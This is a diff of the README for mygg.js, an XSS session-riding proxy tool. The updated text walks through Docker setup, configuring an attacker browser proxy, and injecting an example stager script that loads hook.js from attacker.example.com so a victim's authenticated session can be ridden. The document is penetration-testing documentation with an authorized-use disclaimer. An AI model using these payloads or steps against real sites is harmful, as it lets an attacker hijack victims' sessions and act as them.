@@ -1,82 +1,80 @@
 # mygg.js
-You got an XSS, but are unable to pop the session cookies? Inspired by Mosquito, MalaRIA and BeEF - mygg.js (*Norwegian for mosquito*) is a tool to proxy web traffic via cross-site scripting. By abusing session riding, authentication tokens will automatically be appended to each request by the "victim" browser, enabling the "attacker" to browse as though they were authenticated.
+
+mygg.js (Norwegian for mosquito) is a tool designed to hijack a victim's session by proxying web traffic through cross-site scripting. It allows an attacker to browse as though they were authenticated by the victim's browser. This is useful when you can't steal session cookies directly, but can still perform actions within the victim's session. By leveraging session riding, authentication tokens are automatically appended to each request, effectively acting as a man-in-the-middle. Inspired by tools like Mosquito, MalaRIA, and BeEF, mygg.js simplifies the process of session hijacking through XSS vulnerabilities.
 
 <img src="https://github.com/dsolstad/mygg.js/blob/master/diagram.png" alt="drawing" width="698" height="320"/>
 
-# Download and setup
+### How it works
 
-The server running mygg.js needs to be reachable from the hooked web browser, which means that the mygg.js server needs to be exposed directly on the Internet, unless the victim is on the same network as the mygg.js server.
- 
-The only prerequisite is to have NodeJS above v10, Busboy formData library, OpenSSL and be able to run mygg.js as root.
+1. **Set up the Server**: Ensure you have a server with a domain name pointing to it. This server will host the mygg.js application.
+2. **Clone the Project**: Clone the mygg.js repository on your server. (Refer to the [Installation](#installation) section)
+3. **Follow Installation Process**: Follow the steps in the [Installation](#installation) section to build and run the Docker container.
+4. **Configure the Attacker's Browser**: Open a browser and set the proxy to `http://attacker.example.com:8081`.
+5. **Generate Payloads**: Run the mygg.js application, which will print various payloads in the console. These payloads can be used for different XSS vectors.
+6. **Inject Payload**: Inject one of the payloads into the XSS injection point on the target website and trick the victim into loading it.
+7. **Victim Gets Hooked**: Once the victim loads the payload, their browser will be hooked and load the hook.js script.
+8. **Monitor and Interact**: The attacker must browse to the target website through the proxy. Once the victim is hooked, the attacker can interact with the target website as though they are authenticated as the victim.
 
-```
-apt install nodejs npm openssl
-npm install busboy
-wget https://raw.githubusercontent.com/dsolstad/mygg.js/master/mygg.js
+## Prerequisites
+
+- Attacker server with Docker installed
+- A domain that points to the attacker server
+- The attacker's browser configured to use the proxy at `http://attacker.example.com:8081`
+
+## Limitations
+- **Same-Origin Policy:** `mygg.js` is primarily restricted to the domain where the hook was loaded. This means that you can only browse and interact with the site where the XSS payload was injected.
+- **CORS Misconfigurations:** Some sites may have misconfigured Cross-Origin Resource Sharing (CORS) headers, like an open `access-control-allow-origin` header. These misconfigurations can allow cross-origin requests, potentially expanding what `mygg.js` can access.
+
+## Installation
+
+### 1. **Clone the Project:**
+
+```bash
+git clone https://github.com/root4loot/mygg.js.git
+cd mygg.js
 ```
 
-# Configuration
-In the top of the mygg.js file, there are some configuration parameters. The only thing you really need to change is the domain parameter. If you don't have a domain, change domain to the IP address of the server hosting mygg.js.
+### 2. Run the Container:
+```
+docker build -t mygg .
+docker run -d --name mygg -p 8443:8443 -e DOMAIN=attacker.example.com mygg
+```
+Replace **attacker.example.com** with your actual domain name.
 
-## Self-signed certificate
-When you start mygg.js, it will automatically generate a self-signed certificate, but remember that the victim browser needs to accept the self-signed certificate to load the hook and communicate with mygg.js. This means that from the victim browser, you first need to browse to the attacking mygg.js server to accept the certificiate. 
+## Configuration
 
-## Let's Encrypt
-To use a legitimate CA instead of self-signed, you can use Let's Encrypt against a domain you control:
-```
-sudo add-apt-repository ppa:certbot/certbot
-sudo apt update
-sudo apt install certbot
-sudo certbot certonly --standalone --preferred-challenges http -d example.com
-```
-The certificate and key files should now be located in /etc/letsencrypt/live/example.com. Change the *web_domain* parameter to 'example.com'. The *key* and *cert* parameters should point to the files generated from certbot.
+The Docker container will automatically generate a Let's Encrypt certificate for the specified domain and renew it as needed. No manual certificate management is required.
 
-Example config using Let's Encrypt, where example.com is the server hosting mygg.js:
-```
-const config = {
-    domain: 'example.com',
-    http_interface: '0.0.0.0',
-    https_interface: '0.0.0.0',
-    http_port: 80,
-    https_port: 443,
-    polling_time: 2000,
-    key: '/etc/letsencrypt/live/privkey.pem',
-    cert: '/etc/letsencrypt/live/fullchain.pem',
-    debug: 0,
-    proxy_interface: '127.0.0.1',
-    proxy_port: 8081,
-    proxy_allowed_ips: ['127.0.0.1'],
-}
-```
-  
-# Start
-```
-node mygg.js
-```
-When mygg.js is started, it will output the payload which you insert in the target website, e.g. via Cross-site scripting.
-Three ports will be opened on the server running mygg.js, which by default is 80, 443 and 8081. 
+## Payload Stager
+When mygg.js is started, it will output various XSS payloads you may inject. Example payload:
 
-+ Port 80 - Used for serving the hook, polling and receiving responses, over HTTP.
-+ Port 443 - Used for serving the hook, polling and receiving responses, over HTTPS. 
-+ Port 8081 - The proxy where you should configure your attacking web browser to proxy through, to forward communication to the hooked browser.
-  
-When browsing through the proxy, use http:// instead of https://. If your browser forces over to https, then clear the HSTS cache in your browser by doing the following:
-  
-+ Firefox: ctrl+shift+h -> Right click on the target website and hit "Forget about this site" -> Restart Firefox.  
-+ Chrome: Visit chrome://net-internals/#hsts -> scroll down to "Delete domain security policies" -> Enter domain.
+```html
+<script>
+  var x=document.createElement('script');
+  x.src='//attacker.example.com:8443/hook.js';
+  document.head.appendChild(x);
+</script>
+```
 
-Normally you will only be able to browse the website where the hook was loaded, due to same-origin-policy. However, some sites are misconfigured, i.e. by having an open access-control-allow-origin header, which can make it possible to browse those too.
-  
-You might see some errors in the JavaScript console of the hooked browser, but don't worry, it is supposed to be like that.
+## Ports
+
+- **Port 8443** - Used for serving the hook, polling, and receiving responses over HTTPS.
+- **Port 8081** - The proxy where you should configure your attacking web browser to proxy through, to forward communication to the hooked browser.
+
+
+## Notes
+
+- When configuring attacker browser to use the proxy on port 8081, make sure to use `http://` instead of `https://`.
+- If the browser forces HTTPS, then make sure to clear the HSTS cache first.
+
 
 # TODOs
-
-* Consider implementing the use of websockets instead of HTTP polling.
-* Consider implementing HTTPS interception instead of HTTPS downgrading.
+- Consider implementing the use of WebSockets instead of HTTP polling.
+- Consider implementing HTTPS interception instead of HTTPS downgrading.
 
 # FAQ
-Q: Why not use the other tools instead?  
-A: Mosquito and MalaRIA are old and does not support HTTPS. BeEF is barely maintained and its XSS proxy is full of bugs. 
+**Q:** Why not use the other tools instead?  
+**A:** Mosquito and MalaRIA are old and do not support HTTPS. BeEF is barely maintained and its XSS proxy is full of bugs.
 
 # Disclaimer 
 This software is only meant to be used for the purposes of creating proof-of-concepts during security assessments, to better demonstrate the risks of Cross-site Scripting, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
@@ -84,5 +82,4 @@ This software is only meant to be used for the purposes of creating proof-of-con
 This software is a personal project and not related with any companies, including Project owner and contributors employers.
 
 # LICENSE
-  
-GPLv3
+See [LICENSE](LICENSE)
